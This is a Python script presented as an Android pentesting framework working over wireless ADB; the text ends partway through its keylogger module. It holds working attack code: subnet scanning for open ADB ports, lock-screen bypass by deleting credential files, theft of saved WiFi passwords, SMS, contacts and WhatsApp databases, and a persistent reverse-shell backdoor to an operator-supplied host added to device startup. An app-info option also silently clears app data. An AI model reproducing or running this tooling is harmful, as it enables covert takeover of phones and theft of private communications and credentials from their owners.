#!/usr/bin/env python3
"""
Android Pentesting Framework (APF) v3.0
Wireless IP Connection Edition
License: For Authorized Security Testing Only
"""

import subprocess
import sys
import os
import time
import json
import threading
import socket
import argparse
import shutil
import hashlib
import base64
import tempfile
import re
import select
import struct
from datetime import datetime
from pathlib import Path
from enum import Enum
from dataclasses import dataclass
from typing import Optional, List, Dict, Any, Tuple
import random
import string

# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    """Framework configuration"""
    VERSION = "3.0"
    AUTHOR = "Android Pentesting Framework - Wireless Edition"
    DEFAULT_ADB = "adb"
    DEFAULT_PORT = 5555
    WIRELESS_PORT = 5555
    BACKUP_DIR = Path.home() / ".apf_backups"
    LOG_DIR = Path.home() / ".apf_logs"
    COLORS = {
        'HEADER': '\033[95m',
        'BLUE': '\033[94m',
        'CYAN': '\033[96m',
        'GREEN': '\033[92m',
        'YELLOW': '\033[93m',
        'RED': '\033[91m',
        'ENDC': '\033[0m',
        'BOLD': '\033[1m'
    }
    
    @classmethod
    def colorize(cls, text, color):
        """Add color to terminal text"""
        return f"{cls.COLORS.get(color, '')}{text}{cls.COLORS['ENDC']}"

class ConnectionType(Enum):
    """Connection types"""
    WIRELESS = "wireless"
    USB = "usb"
    BLUETOOTH = "bluetooth"

@dataclass
class DeviceInfo:
    """Device information"""
    ip_address: str
    port: int = 5555
    connection_type: ConnectionType = ConnectionType.WIRELESS
    serial: str = ""
    model: str = ""
    android_version: str = ""
    root_access: bool = False
    connected: bool = False
    last_seen: datetime = None

# ============================================================================
# WIRELESS ADB MANAGER
# ============================================================================

class WirelessADBManager:
    """Manages wireless ADB connections"""
    
    def __init__(self, adb_path="adb"):
        self.adb = adb_path
        self.devices = {}
        self.current_device = None
    
    def is_ip_address(self, address: str) -> bool:
        """Check if string is valid IP address"""
        ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}(:\d+)?$'
        return bool(re.match(ip_pattern, address))
    
    def extract_ip_port(self, address: str) -> Tuple[str, int]:
        """Extract IP and port from address string"""
        if ':' in address:
            ip, port = address.split(':')
            return ip, int(port)
        return address, Config.DEFAULT_PORT
    
    def scan_network(self, subnet: str = "192.168.1.0/24", ports: List[int] = None) -> List[Dict]:
        """Scan network for ADB devices"""
        if ports is None:
            ports = [5555, 5556, 5557, 5558]
        
        devices_found = []
        
        print(f"Scanning {subnet} for ADB devices...")
        
        # Use nmap if available
        nmap_path = shutil.which("nmap")
        if nmap_path:
            try:
                # Scan for open ADB ports
                cmd = [nmap_path, "-p", ",".join(str(p) for p in ports), "-sT", subnet]
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                # Parse nmap output
                for line in result.stdout.split('\n'):
                    if "/tcp" in line and "open" in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            port_part = parts[0].split('/')[0]
                            for port in ports:
                                if port_part == str(port):
                                    # Get IP from previous lines
                                    ip_match = re.search(r'Nmap scan report for (\S+)', result.stdout)
                                    if ip_match:
                                        ip = ip_match.group(1)
                                        devices_found.append({
                                            "ip": ip,
                                            "port": port,
                                            "status": "discovered"
                                        })
            except:
                pass
        
        # Try direct ADB discovery
        for port in ports:
            # Try common IP ranges
            base_ip = subnet.split('.')[0:3]
            for i in range(1, 255):
                ip = f"{'.'.join(base_ip)}.{i}"
                try:
                    # Quick port check
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    
                    if result == 0:
                        # Port is open, try ADB connect
                        cmd = [self.adb, "connect", f"{ip}:{port}"]
                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=2)
                        
                        if "connected" in result.stdout:
                            devices_found.append({
                                "ip": ip,
                                "port": port,
                                "status": "connected"
                            })
                        elif "unable" not in result.stdout:
                            devices_found.append({
                                "ip": ip,
                                "port": port,
                                "status": "open_port"
                            })
                except:
                    continue
        
        return devices_found
    
    def connect(self, address: str) -> Tuple[bool, str]:
        """
        Connect to device by IP address
        
        Args:
            address: IP address (with optional port)
            
        Returns:
            Tuple of (success, message)
        """
        if not self.is_ip_address(address):
            return False, f"Invalid IP address format: {address}"
        
        ip, port = self.extract_ip_port(address)
        full_address = f"{ip}:{port}"
        
        print(f"Connecting to {full_address}...")
        
        try:
            # Try to connect
            cmd = [self.adb, "connect", full_address]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if "connected" in result.stdout:
                # Verify connection
                time.sleep(1)
                verify_cmd = [self.adb, "-s", full_address, "get-state"]
                verify = subprocess.run(verify_cmd, capture_output=True, text=True, timeout=5)
                
                if verify.returncode == 0 and "device" in verify.stdout:
                    # Get device info
                    info = self.get_device_info(full_address)
                    
                    device = DeviceInfo(
                        ip_address=ip,
                        port=port,
                        connection_type=ConnectionType.WIRELESS,
                        serial=full_address,
                        model=info.get("model", "Unknown"),
                        android_version=info.get("android_version", "Unknown"),
                        connected=True,
                        last_seen=datetime.now()
                    )
                    
                    self.devices[full_address] = device
                    self.current_device = device
                    
                    return True, f"Successfully connected to {full_address}"
                else:
                    return False, "Connected but device not responding"
            else:
                return False, result.stdout.strip()
                
        except subprocess.TimeoutExpired:
            return False, "Connection timeout"
        except Exception as e:
            return False, f"Connection error: {str(e)}"
    
    def get_device_info(self, address: str) -> Dict:
        """Get device information"""
        info = {}
        
        commands = {
            "model": f"-s {address} shell getprop ro.product.model",
            "brand": f"-s {address} shell getprop ro.product.brand",
            "device": f"-s {address} shell getprop ro.product.device",
            "android_version": f"-s {address} shell getprop ro.build.version.release",
            "sdk_version": f"-s {address} shell getprop ro.build.version.sdk",
            "serial": f"-s {address} shell getprop ro.serialno",
            "security_patch": f"-s {address} shell getprop ro.build.version.security_patch"
        }
        
        for key, cmd in commands.items():
            try:
                result = subprocess.run([self.adb] + cmd.split(), 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    info[key] = result.stdout.strip()
            except:
                info[key] = "Unknown"
        
        return info
    
    def check_root(self, address: str) -> bool:
        """Check if device has root access"""
        try:
            cmd = [self.adb, "-s", address, "shell", "su", "-c", "echo root_test"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            return result.returncode == 0 and "root_test" in result.stdout
        except:
            return False
    
    def disconnect(self, address: str = None) -> bool:
        """Disconnect from device"""
        if address is None and self.current_device:
            address = f"{self.current_device.ip_address}:{self.current_device.port}"
        
        if address:
            try:
                cmd = [self.adb, "disconnect", address]
                subprocess.run(cmd, capture_output=True, timeout=5)
                
                if address in self.devices:
                    del self.devices[address]
                
                if self.current_device and self.current_device.serial == address:
                    self.current_device = None
                
                return True
            except:
                return False
        return False
    
    def list_connected(self) -> List[str]:
        """List currently connected devices"""
        try:
            cmd = [self.adb, "devices"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            
            devices = []
            for line in result.stdout.strip().split('\n')[1:]:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 2 and parts[1] == "device":
                        devices.append(parts[0])
            
            return devices
        except:
            return []

# ============================================================================
# PENTESTING FRAMEWORK
# ============================================================================

class AndroidPentestFramework:
    """Main framework class with wireless capabilities"""
    
    def __init__(self, adb_path="adb", verbose=False):
        self.adb = WirelessADBManager(adb_path)
        self.verbose = verbose
        self.current_device = None
        self.modules = {}
        self.session_log = []
        self.session_id = self._generate_session_id()
        
        # Initialize directories
        self._init_directories()
        
        # Load modules
        self._load_modules()
        
        self.print_banner()
    
    def _init_directories(self):
        """Create necessary directories"""
        for directory in [Config.BACKUP_DIR, Config.LOG_DIR]:
            directory.mkdir(exist_ok=True)
    
    def _generate_session_id(self):
        """Generate unique session ID"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"{timestamp}_{random_str}"
    
    def print_banner(self):
        """Print framework banner"""
        banner = f"""
╔══════════════════════════════════════════════════════════╗
║    ANDROID PENTESTING FRAMEWORK v{Config.VERSION} - WIRELESS     ║
║         Connect via IP Address - No USB Required         ║
╚══════════════════════════════════════════════════════════╝
        """
        print(Config.colorize(banner, "HEADER"))
    
    def log(self, message, level="INFO"):
        """Log message with color"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = "RED" if level == "ERROR" else "YELLOW" if level == "WARNING" else "GREEN"
        formatted = f"[{timestamp}] [{level}] {message}"
        self.session_log.append(formatted)
        
        if self.verbose or level in ["ERROR", "WARNING"]:
            print(Config.colorize(formatted, color))
    
    def run_command(self, command, capture_output=True):
        """
        Execute ADB command on current device
        
        Args:
            command: Command to execute
            capture_output: Whether to capture output
            
        Returns:
            Command result
        """
        if not self.current_device:
            self.log("No device connected", "ERROR")
            return None
        
        full_address = f"{self.current_device.ip_address}:{self.current_device.port}"
        cmd_parts = [self.adb.adb, "-s", full_address] + command.split()
        
        try:
            if capture_output:
                result = subprocess.run(cmd_parts, capture_output=True, text=True, timeout=30)
                return result
            else:
                result = subprocess.run(cmd_parts, stdout=subprocess.DEVNULL, 
                                      stderr=subprocess.DEVNULL, timeout=30)
                return result
        except Exception as e:
            self.log(f"Command error: {e}", "ERROR")
            return None
    
    def _load_modules(self):
        """Load all pentesting modules"""
        self.modules = {
            "lock_bypass": {
                "name": "Lock Screen Bypass",
                "description": "Bypass Android lock screen",
                "function": self.lock_bypass,
                "requires_root": True
            },
            "screen_mirror": {
                "name": "Screen Mirroring",
                "description": "Mirror device screen to computer",
                "function": self.screen_mirror,
                "requires_root": False
            },
            "screen_record": {
                "name": "Screen Recording",
                "description": "Record device screen",
                "function": self.screen_record,
                "requires_root": False
            },
            "take_screenshot": {
                "name": "Take Screenshot",
                "description": "Capture device screen",
                "function": self.take_screenshot,
                "requires_root": False
            },
            "wifi_control": {
                "name": "WiFi Control",
                "description": "Enable/disable WiFi, scan networks",
                "function": self.wifi_control,
                "requires_root": True
            },
            "shell_access": {
                "name": "Interactive Shell",
                "description": "Access device shell",
                "function": self.interactive_shell,
                "requires_root": False
            },
            "extract_files": {
                "name": "File Extraction",
                "description": "Extract files from device",
                "function": self.extract_files,
                "requires_root": True
            },
            "app_manager": {
                "name": "App Manager",
                "description": "List, install, uninstall apps",
                "function": self.app_manager,
                "requires_root": False
            },
            "install_backdoor": {
                "name": "Backdoor Installation",
                "description": "Install persistent backdoor",
                "function": self.install_backdoor,
                "requires_root": True
            },
            "keylogger": {
                "name": "Keylogger",
                "description": "Install and manage keylogger",
                "function": self.keylogger,
                "requires_root": True
            },
            "network_scan": {
                "name": "Network Scanner",
                "description": "Scan network for devices",
                "function": self.network_scan,
                "requires_root": False
            },
            "vulnerability_scan": {
                "name": "Vulnerability Scanner",
                "description": "Scan for known vulnerabilities",
                "function": self.vulnerability_scan,
                "requires_root": False
            },
            "system_info": {
                "name": "System Information",
                "description": "Get detailed system info",
                "function": self.system_info,
                "requires_root": False
            },
            "port_forwarding": {
                "name": "Port Forwarding",
                "description": "Forward device ports to localhost",
                "function": self.port_forwarding,
                "requires_root": False
            }
        }
    
    # ============================================================================
    # CONNECTION METHODS
    # ============================================================================
    
    def connect_device(self, address=None):
        """Connect to device by IP address"""
        if not address:
            address = input("Enter device IP address (with optional port): ").strip()
        
        if not self.adb.is_ip_address(address):
            print(Config.colorize("Invalid IP address format. Use: 192.168.1.100 or 192.168.1.100:5555", "RED"))
            return False
        
        success, message = self.adb.connect(address)
        
        if success:
            self.current_device = self.adb.current_device
            print(Config.colorize(f"✓ {message}", "GREEN"))
            
            # Check root access
            if self.adb.check_root(f"{self.current_device.ip_address}:{self.current_device.port}"):
                self.current_device.root_access = True
                print(Config.colorize("✓ Root access available", "GREEN"))
            else:
                print(Config.colorize("⚠ Root access not available", "YELLOW"))
            
            return True
        else:
            print(Config.colorize(f"✗ {message}", "RED"))
            
            # Suggest troubleshooting
            print("\nTroubleshooting:")
            print("1. Make sure device is on the same network")
            print("2. Enable Wireless ADB debugging on device")
            print("3. Check if port 5555 is open")
            print("4. Try different port (e.g., 192.168.1.100:5556)")
            
            return False
    
    def disconnect_device(self):
        """Disconnect from current device"""
        if self.current_device:
            self.adb.disconnect()
            self.current_device = None
            print(Config.colorize("Disconnected from device", "YELLOW"))
        else:
            print(Config.colorize("No device connected", "RED"))
    
    def network_scan(self):
        """Scan network for Android devices"""
        print(Config.colorize("\n[NETWORK SCANNER]", "HEADER"))
        
        # Get network interface info
        try:
            import netifaces
            interfaces = netifaces.interfaces()
            
            print("Available network interfaces:")
            for i, iface in enumerate(interfaces, 1):
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip_info = addrs[netifaces.AF_INET][0]
                    print(f"  {i}. {iface}: {ip_info.get('addr', 'No IP')}")
            
            iface_choice = input("\nSelect interface (number) or press Enter for default: ").strip()
            if iface_choice and iface_choice.isdigit():
                iface = interfaces[int(iface_choice)-1]
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    subnet = '.'.join(ip.split('.')[0:3]) + ".0/24"
                else:
                    subnet = "192.168.1.0/24"
            else:
                subnet = "192.168.1.0/24"
        except ImportError:
            subnet = "192.168.1.0/24"
            print(f"Using default subnet: {subnet}")
        
        # Scan for devices
        devices = self.adb.scan_network(subnet)
        
        if devices:
            print(f"\nFound {len(devices)} device(s):")
            for i, device in enumerate(devices, 1):
                status_color = "GREEN" if device["status"] == "connected" else "YELLOW"
                print(f"  {i}. {device['ip']}:{device['port']} [{Config.colorize(device['status'], status_color)}]")
            
            # Option to connect
            choice = input("\nConnect to device (number) or press Enter to skip: ").strip()
            if choice and choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(devices):
                    device = devices[idx]
                    self.connect_device(f"{device['ip']}:{device['port']}")
        else:
            print("No devices found on network")
        
        return {"success": True, "devices": devices}
    
    # ============================================================================
    # PENTESTING MODULES
    # ============================================================================
    
    def lock_bypass(self):
        """Bypass lock screen"""
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        print(Config.colorize("\n[LOCK SCREEN BYPASS]", "HEADER"))
        
        if not self.current_device.root_access:
            print(Config.colorize("Root access required for this module", "RED"))
            return {"success": False}
        
        methods = [
            ("Delete lock files", "Delete lock screen credential files"),
            ("Disable SystemUI", "Temporarily disable lock screen"),
            ("Recovery mode", "Use recovery to remove lock"),
            ("ADB test", "Test if lock screen is vulnerable")
        ]
        
        for i, (name, desc) in enumerate(methods, 1):
            print(f"{i}. {name} - {desc}")
        
        choice = input("\nSelect method (1-4): ").strip()
        
        if choice == "1":
            # Delete lock files
            print("Deleting lock screen files...")
            
            lock_files = [
                "/data/system/*.key",
                "/data/system/locksettings.db*",
                "/data/system/gatekeeper.*",
                "/data/system/password.key",
                "/data/system/gesture.key"
            ]
            
            for pattern in lock_files:
                self.run_command(f"shell su -c 'rm -f {pattern}'")
            
            print(Config.colorize("Lock files deleted. Reboot device to test.", "GREEN"))
            
            reboot = input("Reboot device now? (y/n): ").lower()
            if reboot == 'y':
                self.run_command("reboot")
                print("Device rebooting...")
            
            return {"success": True, "method": "file_deletion"}
        
        elif choice == "2":
            # Disable SystemUI
            print("Disabling SystemUI...")
            self.run_command("shell pm disable com.android.systemui")
            self.run_command("shell am start -a android.settings.SETTINGS")
            print(Config.colorize("SystemUI disabled. Lock screen should be gone.", "GREEN"))
            return {"success": True, "method": "systemui_disable"}
        
        elif choice == "3":
            # Recovery mode method
            print("Rebooting to recovery mode...")
            self.run_command("reboot recovery")
            print("Device should reboot to recovery. Manual intervention required.")
            return {"success": True, "method": "recovery_mode"}
        
        elif choice == "4":
            # Test lock screen vulnerability
            print("Testing lock screen vulnerability...")
            
            # Try to input keyevents
            self.run_command("shell input keyevent 82")  # MENU
            time.sleep(0.5)
            self.run_command("shell input keyevent 66")  # ENTER
            
            print("Test completed. Check if device unlocked.")
            return {"success": True, "method": "vulnerability_test"}
        
        return {"success": False}
    
    def screen_mirror(self):
        """Mirror device screen"""
        print(Config.colorize("\n[SCREEN MIRRORING]", "HEADER"))
        
        # Check if scrcpy is available
        scrcpy_path = shutil.which("scrcpy")
        if not scrcpy_path:
            print(Config.colorize("scrcpy not found. Install for screen mirroring.", "RED"))
            print("Install: sudo apt install scrcpy (Ubuntu) or brew install scrcpy (macOS)")
            return {"success": False}
        
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        print("Starting screen mirroring...")
        print("Press Ctrl+C to stop")
        
        try:
            # Run scrcpy with wireless connection
            device_address = f"{self.current_device.ip_address}:{self.current_device.port}"
            cmd = [scrcpy_path, "--tcpip", device_address, "--bit-rate", "2M", "--max-size", "1024"]
            
            subprocess.run(cmd)
            return {"success": True}
            
        except KeyboardInterrupt:
            print("\nScreen mirroring stopped")
            return {"success": True}
        except Exception as e:
            print(f"Error: {e}")
            return {"success": False}
    
    def screen_record(self, duration=30):
        """Record device screen"""
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        print(Config.colorize("\n[SCREEN RECORDING]", "HEADER"))
        
        duration = input(f"Recording duration in seconds (default {duration}): ").strip()
        duration = int(duration) if duration.isdigit() else 30
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screen_record_{timestamp}.mp4"
        
        print(f"Recording {duration} seconds...")
        
        try:
            # Start recording on device
            self.run_command(f"shell screenrecord --verbose --time-limit {duration} /sdcard/{filename}")
            
            # Wait for recording to complete
            print(f"Recording... (waiting {duration + 2} seconds)")
            time.sleep(duration + 2)
            
            # Pull recording to computer
            local_path = Config.BACKUP_DIR / filename
            self.run_command(f"pull /sdcard/{filename} {local_path}")
            
            # Clean up device
            self.run_command(f"shell rm /sdcard/{filename}")
            
            if local_path.exists():
                print(Config.colorize(f"Recording saved to: {local_path}", "GREEN"))
                return {"success": True, "file": str(local_path)}
            else:
                print(Config.colorize("Failed to save recording", "RED"))
                return {"success": False}
                
        except Exception as e:
            print(f"Recording error: {e}")
            return {"success": False}
    
    def take_screenshot(self):
        """Take screenshot of device"""
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        
        print("Taking screenshot...")
        
        try:
            # Take screenshot on device
            self.run_command(f"shell screencap -p /sdcard/{filename}")
            
            # Pull to computer
            local_path = Config.BACKUP_DIR / filename
            self.run_command(f"pull /sdcard/{filename} {local_path}")
            
            # Clean up device
            self.run_command(f"shell rm /sdcard/{filename}")
            
            if local_path.exists():
                print(Config.colorize(f"Screenshot saved to: {local_path}", "GREEN"))
                
                # Try to display if PIL available
                try:
                    from PIL import Image
                    img = Image.open(local_path)
                    img.show()
                except:
                    pass
                
                return {"success": True, "file": str(local_path)}
            else:
                return {"success": False}
                
        except Exception as e:
            print(f"Screenshot error: {e}")
            return {"success": False}
    
    def wifi_control(self):
        """Control WiFi on device"""
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        print(Config.colorize("\n[WiFi CONTROL]", "HEADER"))
        
        actions = [
            ("status", "Check WiFi status"),
            ("enable", "Enable WiFi"),
            ("disable", "Disable WiFi"),
            ("scan", "Scan for networks"),
            ("connect", "Connect to network (requires root)"),
            ("get_passwords", "Get saved WiFi passwords (requires root)")
        ]
        
        for i, (action, desc) in enumerate(actions, 1):
            print(f"{i}. {action} - {desc}")
        
        choice = input("\nSelect action (1-6): ").strip()
        
        if choice == "1":
            # Check status
            result = self.run_command("shell dumpsys wifi | grep -i 'wi-fi'")
            if result:
                print(result.stdout[:500])
            return {"success": True}
        
        elif choice == "2":
            # Enable WiFi
            self.run_command("shell svc wifi enable")
            print(Config.colorize("WiFi enabled", "GREEN"))
            return {"success": True}
        
        elif choice == "3":
            # Disable WiFi
            self.run_command("shell svc wifi disable")
            print(Config.colorize("WiFi disabled", "GREEN"))
            return {"success": True}
        
        elif choice == "4":
            # Scan networks
            print("Scanning for networks...")
            self.run_command("shell cmd wifi start-scan")
            time.sleep(3)
            result = self.run_command("shell cmd wifi list-scan-results")
            if result:
                print(result.stdout)
            return {"success": True}
        
        elif choice == "5":
            # Connect to network
            if not self.current_device.root_access:
                print(Config.colorize("Root access required", "RED"))
                return {"success": False}
            
            ssid = input("SSID: ").strip()
            password = input("Password: ").strip()
            
            # Create network config
            config = f'network={{\n  ssid="{ssid}"\n  psk="{password}"\n}}\n'
            
            # Save to temp file and push
            with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as f:
                f.write(config)
                temp_path = f.name
            
            try:
                self.run_command(f"push {temp_path} /data/local/tmp/wifi.conf")
                self.run_command("shell su -c 'cat /data/local/tmp/wifi.conf >> /data/misc/wifi/wpa_supplicant.conf'")
                self.run_command("shell svc wifi restart")
                print(Config.colorize(f"Attempting to connect to {ssid}", "GREEN"))
            finally:
                os.unlink(temp_path)
            
            return {"success": True}
        
        elif choice == "6":
            # Get WiFi passwords
            if not self.current_device.root_access:
                print(Config.colorize("Root access required", "RED"))
                return {"success": False}
            
            result = self.run_command("shell su -c 'cat /data/misc/wifi/wpa_supplicant.conf'")
            if result and result.stdout:
                passwords_file = Config.BACKUP_DIR / f"wifi_passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(passwords_file, 'w') as f:
                    f.write(result.stdout)
                
                print(Config.colorize(f"WiFi passwords saved to: {passwords_file}", "GREEN"))
                print("\nExtracted networks:")
                
                # Parse networks
                networks = re.findall(r'network=\{([^}]+)\}', result.stdout, re.DOTALL)
                for network in networks:
                    ssid_match = re.search(r'ssid="([^"]+)"', network)
                    psk_match = re.search(r'psk="([^"]+)"', network)
                    
                    if ssid_match:
                        ssid = ssid_match.group(1)
                        password = psk_match.group(1) if psk_match else "No password"
                        print(f"  SSID: {ssid}, Password: {password}")
                
                return {"success": True, "file": str(passwords_file)}
        
        return {"success": False}
    
    def interactive_shell(self):
        """Interactive device shell"""
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        print(Config.colorize("\n[INTERACTIVE SHELL]", "HEADER"))
        print("Type 'exit' or 'quit' to return to menu")
        print("Type 'su' for root shell (if available)")
        print("-" * 50)
        
        device_address = f"{self.current_device.ip_address}:{self.current_device.port}"
        
        while True:
            try:
                cmd = input(f"android@{device_address}$ ").strip()
                
                if cmd.lower() in ['exit', 'quit', 'q']:
                    break
                
                if cmd == "su" and self.current_device.root_access:
                    print("Switching to root shell...")
                    while True:
                        root_cmd = input(f"root@{device_address}# ").strip()
                        if root_cmd.lower() in ['exit', 'quit']:
                            break
                        if root_cmd:
                            result = subprocess.run(
                                [self.adb.adb, "-s", device_address, "shell", "su", "-c", root_cmd],
                                capture_output=True,
                                text=True
                            )
                            if result.stdout:
                                print(result.stdout)
                            if result.stderr:
                                print(result.stderr, file=sys.stderr)
                    continue
                
                if cmd:
                    result = subprocess.run(
                        [self.adb.adb, "-s", device_address, "shell", cmd],
                        capture_output=True,
                        text=True
                    )
                    if result.stdout:
                        print(result.stdout)
                    if result.stderr:
                        print(result.stderr, file=sys.stderr)
                        
            except KeyboardInterrupt:
                print("\n^C")
            except Exception as e:
                print(f"Error: {e}")
        
        return {"success": True}
    
    def extract_files(self):
        """Extract files from device"""
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        if not self.current_device.root_access:
            print(Config.colorize("Root access required for file extraction", "RED"))
            return {"success": False}
        
        print(Config.colorize("\n[FILE EXTRACTION]", "HEADER"))
        
        targets = [
            ("SMS", "/data/data/com.android.providers.telephony/databases/mmssms.db"),
            ("Contacts", "/data/data/com.android.providers.contacts/databases/contacts2.db"),
            ("Call Logs", "/data/data/com.android.providers.contacts/databases/calllog.db"),
            ("WhatsApp", "/data/data/com.whatsapp/databases/msgstore.db"),
            ("WiFi Passwords", "/data/misc/wifi/wpa_supplicant.conf"),
            ("Camera Photos", "/sdcard/DCIM/Camera/"),
            ("Downloads", "/sdcard/Download/"),
            ("Documents", "/sdcard/Documents/"),
            ("Custom", "")
        ]
        
        for i, (name, path) in enumerate(targets, 1):
            print(f"{i}. {name:<20} {path}")
        
        choice = input(f"\nSelect target (1-{len(targets)}): ").strip()
        
        if not choice.isdigit():
            return {"success": False}
        
        idx = int(choice) - 1
        if idx < 0 or idx >= len(targets):
            return {"success": False}
        
        name, path = targets[idx]
        
        if name == "Custom":
            path = input("Enter device path: ").strip()
            name = "custom"
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        extract_dir = Config.BACKUP_DIR / f"extraction_{timestamp}"
        extract_dir.mkdir(exist_ok=True)
        
        print(f"Extracting {name}...")
        
        try:
            # Check if path exists
            result = self.run_command(f"shell ls {path}")
            if not result or result.returncode != 0:
                print(f"Path not found: {path}")
                return {"success": False}
            
            # Extract
            local_path = extract_dir / Path(path).name
            self.run_command(f"pull {path} {local_path}")
            
            if local_path.exists():
                size = local_path.stat().st_size
                print(Config.colorize(f"Extracted to: {local_path} ({size} bytes)", "GREEN"))
                return {"success": True, "file": str(local_path)}
            else:
                return {"success": False}
                
        except Exception as e:
            print(f"Extraction error: {e}")
            return {"success": False}
    
    def app_manager(self):
        """Manage applications"""
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        print(Config.colorize("\n[APP MANAGER]", "HEADER"))
        
        actions = [
            ("list", "List installed apps"),
            ("install", "Install APK"),
            ("uninstall", "Uninstall app"),
            ("extract", "Extract APK"),
            ("info", "Get app info")
        ]
        
        for i, (action, desc) in enumerate(actions, 1):
            print(f"{i}. {action} - {desc}")
        
        choice = input("\nSelect action (1-5): ").strip()
        
        if choice == "1":
            # List apps
            result = self.run_command("shell pm list packages -f")
            if result:
                apps = []
                for line in result.stdout.strip().split('\n'):
                    if line.startswith("package:"):
                        parts = line.split('=')
                        if len(parts) == 2:
                            path = parts[0].replace("package:", "")
                            package = parts[1]
                            apps.append((package, path))
                
                print(f"\nFound {len(apps)} apps:")
                for i, (package, path) in enumerate(apps[:20], 1):
                    print(f"  {i}. {package:<40} {path}")
                
                if len(apps) > 20:
                    print(f"  ... and {len(apps)-20} more")
            
            return {"success": True, "apps": len(apps)}
        
        elif choice == "2":
            # Install APK
            apk_path = input("APK file path: ").strip()
            if os.path.exists(apk_path):
                self.run_command(f"install {apk_path}")
                print(Config.colorize("APK installed", "GREEN"))
                return {"success": True}
            else:
                print("File not found")
                return {"success": False}
        
        elif choice == "3":
            # Uninstall app
            package = input("Package name: ").strip()
            self.run_command(f"uninstall {package}")
            print(Config.colorize(f"Uninstalled {package}", "GREEN"))
            return {"success": True}
        
        elif choice == "4":
            # Extract APK
            package = input("Package name: ").strip()
            
            # Get APK path
            result = self.run_command(f"shell pm path {package}")
            if result:
                apk_path = result.stdout.strip().replace("package:", "")
                
                # Extract
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                extract_dir = Config.BACKUP_DIR / "apks" / f"{package}_{timestamp}"
                extract_dir.mkdir(parents=True, exist_ok=True)
                
                self.run_command(f"pull {apk_path} {extract_dir}/")
                
                print(Config.colorize(f"APK extracted to: {extract_dir}", "GREEN"))
                return {"success": True, "directory": str(extract_dir)}
        
        elif choice == "5":
            # App info
            package = input("Package name: ").strip()
            
            # Get app info
            cmds = [
                f"shell dumpsys package {package}",
                f"shell pm dump {package}",
                f"shell pm clear {package}"
            ]
            
            for cmd in cmds:
                result = self.run_command(cmd)
                if result and result.stdout:
                    print(result.stdout[:1000])
            
            return {"success": True}
        
        return {"success": False}
    
    def install_backdoor(self):
        """Install backdoor on device"""
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        if not self.current_device.root_access:
            print(Config.colorize("Root access required for backdoor", "RED"))
            return {"success": False}
        
        print(Config.colorize("\n[BACKDOOR INSTALLATION]", "HEADER"))
        print("WARNING: This will install persistent backdoor on device!")
        
        confirm = input("Continue? (y/n): ").lower()
        if confirm != 'y':
            return {"success": False}
        
        backdoor_type = input("\nBackdoor type:\n1. Reverse shell\n2. WebSocket\n3. SSH\nChoice (1-3): ").strip()
        
        if backdoor_type == "1":
            # Reverse shell
            lhost = input("Your IP address: ").strip()
            lport = input("Port (default 4444): ").strip() or "4444"
            
            # Create reverse shell script
            script = f'''#!/system/bin/sh
while true; do
    /system/bin/sh -i &>/dev/tcp/{lhost}/{lport} 0>&1
    sleep 60
done'''
            
            # Push to device
            self.run_command("shell su -c 'echo \"#!/system/bin/sh\" > /data/local/tmp/backdoor.sh'")
            self.run_command(f"shell su -c 'echo \"{script}\" >> /data/local/tmp/backdoor.sh'")
            self.run_command("shell su -c 'chmod 755 /data/local/tmp/backdoor.sh'")
            
            # Add to startup
            self.run_command("shell su -c 'echo \"/data/local/tmp/backdoor.sh &\" >> /system/etc/init.sh'")
            
            print(Config.colorize("Reverse shell backdoor installed", "GREEN"))
            print(f"Start listener: nc -lvnp {lport}")
            
            return {"success": True, "type": "reverse_shell"}
        
        return {"success": False}
    
    def keylogger(self):
        """Install and manage keylogger"""
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        if not self.current_device.root_access:
            print(Config.colorize("Root access required for keylogger", "RED"))
            return {"success": False}
        
        print(Config.colorize("\n[KEYLOGGER]", "HEADER"))
        
        actions = [
            ("install", "Install keylogger"),
            ("start", "Start keylogger"),
            ("stop", "Stop keylogger"),
            ("retrieve", "Retrieve logs"),
            ("uninstall", "Uninstall keylogger")
        ]
        
        for i, (action, desc) in enumerate(actions, 1):
            print(f"{i}. {action} - {desc}")
        
        choice = input("\nSelect action (1-5): ").strip()
        
        if choice == "1":
            print("Building keylogger APK...")
            
            # Create simple keylogger script
